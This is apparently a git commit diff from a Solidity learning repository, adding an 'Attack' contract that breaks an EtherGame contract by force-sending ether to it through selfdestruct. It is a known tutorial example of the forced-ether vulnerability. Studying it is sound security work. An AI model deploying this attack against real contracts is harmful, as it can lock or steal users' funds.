a82e91302e8d0a7c892f2b01ba0be1192b3fb3e9
jinwon93 <kjw8208@nate.com>
2022-06-09 21:27:23 +0900

    20220609

--- Applications/SelfDestruct.sol
+++ Applications/SelfDestruct.sol
@@ -24,3 +24,22 @@ contract EtherGame {
         require(sent, "Failed to send Ether");
     }
 }
+
+
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function attack() public payable {
+        // You can simply break the game by sending ether so that
+        // the game balance >= 7 ether
+
+        // cast address to payable
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
